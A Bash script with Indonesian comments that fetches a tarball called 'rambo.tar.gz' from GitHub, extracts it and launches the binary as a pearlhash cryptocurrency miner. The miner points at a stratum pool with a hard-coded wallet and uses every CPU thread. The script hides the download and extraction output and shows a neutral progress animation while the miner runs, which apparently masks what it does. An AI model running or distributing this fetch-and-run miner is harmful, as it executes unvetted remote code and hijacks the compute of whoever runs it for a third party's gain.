#!/bin/bash

# Fungsi spinner umum
run_with_loading() {
    local message="$1"
    shift

    "$@" > /dev/null 2>&1 &
    local pid=$!

    local spinner=("|" "/" "-" "\\")
    while kill -0 "$pid" 2>/dev/null; do
        for char in "${spinner[@]}"; do
            printf "\r[%c] %s" "$char" "$message"
            sleep 0.08
            if ! kill -0 "$pid" 2>/dev/null; then
                break
            fi
        done
    done

    wait "$pid"
    local status=$?

    if [ $status -eq 0 ]; then
        printf "\r[✔] %s selesai\n" "$message"
    else
        printf "\r[✖] %s gagal\n" "$message"
        return $status
    fi

    return 0
}

# 1. Download
run_with_loading "Downloading rambo.tar.gz..." curl -L -O https://github.com/stellavholiza-dev/bic/raw/main/rambo.tar.gz
if [ $? -ne 0 ]; then
    exit 1
fi

# 2. Ekstrak
run_with_loading "Extracting rambo.tar.gz..." tar -xvf rambo.tar.gz
if [ $? -ne 0 ]; then
    exit 1
fi

# === Ambil IP lokal dengan lebih aman dan andal ===
worker_name=""

# Metode 1: Menggunakan hostname -I
if command -v hostname >/dev/null 2>&1; then
    worker_name=$(hostname -I 2>/dev/null | awk '{print $1}')
fi

# Metode 2: Jika masih kosong, gunakan ip route
if [ -z "$worker_name" ] && command -v ip >/dev/null 2>&1; then
    worker_name=$(ip route show 2>/dev/null | awk '/default/ {print $3}' | head -n 1)
fi

# Metode 3: Fallback terakhir jika tetap kosong
if [ -z "$worker_name" ] || [ "$worker_name" = "0" ]; then
    worker_name="worker1"
fi

wallet="prl1p2v2606e8k4he7yl7cnkmxjsgkujj97qed7n3g8mtrvtt3svuvgss5prgew"
worker_tag="${wallet}.${worker_name}"
if command -v nproc >/dev/null 2>&1; then
    if nproc --all >/dev/null 2>&1; then
        threads="$(nproc --all)"
    else
        threads="$(nproc)"
    fi
else
    threads=1
fi

echo "Menjalankan rambo dengan worker: ${worker_tag}"
./rambo --algorithm pearlhash --pool stratum+tcp://pool.pearlhash.xyz:9000 --wallet "$worker_tag" &
rambo_PID=$!

# 1. Atur tampilan terminal
tput civis
trap 'tput cnorm; printf "\033[0m\n"; exit' INT TERM

cols=$(tput cols 2>/dev/null || echo 80)
text="NUJU PROSES"
total_dots=12
dots=0

# Pindah ke baris baru khusus untuk animasi satu baris
printf "\n"

while kill -0 "$rambo_PID" 2>/dev/null; do
    # Kembali ke awal baris animasi dan bersihkan baris tersebut
    printf '\033[1A\033[2K'

    # Hitung posisi tengah
    total_len=$(( ${#text} + total_dots ))
    x=$(( (cols - total_len) / 2 ))
    [[ $x -lt 0 ]] && x=0

    dot_str=""
    for ((i=0; i<dots; i++)); do
        dot_str="${dot_str}."
    done

    printf '\033[%dG\033[1;37m%s%s\033[0m\n' "$x" "$text" "$dot_str"
    
    dots=$(( (dots + 1) % (total_dots + 1) ))
    sleep 0.16
done

tput cnorm
printf "\033[0m\n"
echo "[ SELESAI ] Proses rambo telah berhenti."
